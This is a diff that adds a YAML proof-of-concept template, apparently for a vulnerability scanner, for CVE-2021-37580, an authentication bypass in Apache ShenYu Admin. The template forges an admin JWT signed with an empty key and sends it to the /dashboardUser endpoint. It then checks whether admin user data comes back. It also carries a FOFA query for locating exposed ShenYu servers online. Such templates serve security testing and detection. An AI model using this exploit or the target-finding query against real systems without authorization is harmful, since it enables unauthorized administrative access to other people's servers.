@@ -1,0 +1,20 @@
+id: poc-yaml-apache-shenyu-token-hardcoded
+info:
+  name: Apache ShenYu Admin 身份验证绕过漏洞(CVE-2021-37580)
+  severity: high
+  tags:
+  - 认证绕过
+  - CVE-2021-37580
+  finger: shenyu
+  fofa: body="id=\"httpPath\"" && body="th:text=\"${domain}\""
+variables:
+  r_token: gen_jwt(`{"userName":"admin"}`, "HS256", "")
+requests:
+- method: GET
+  path: /dashboardUser
+  headers:
+    X-Access-Token: '{{.r_token}}'
+  expression: "status_code == 200 && \ncontains(body,\"query success\") &&\ncontains(body,\"\
+    \\\"userName\\\":\\\"admin\\\"\") &&\ncontains(body,\"\\\"code\\\":200\") &&\n\
+    contains(body,\"\\\"dataList\\\"\")\n"
+transport: http
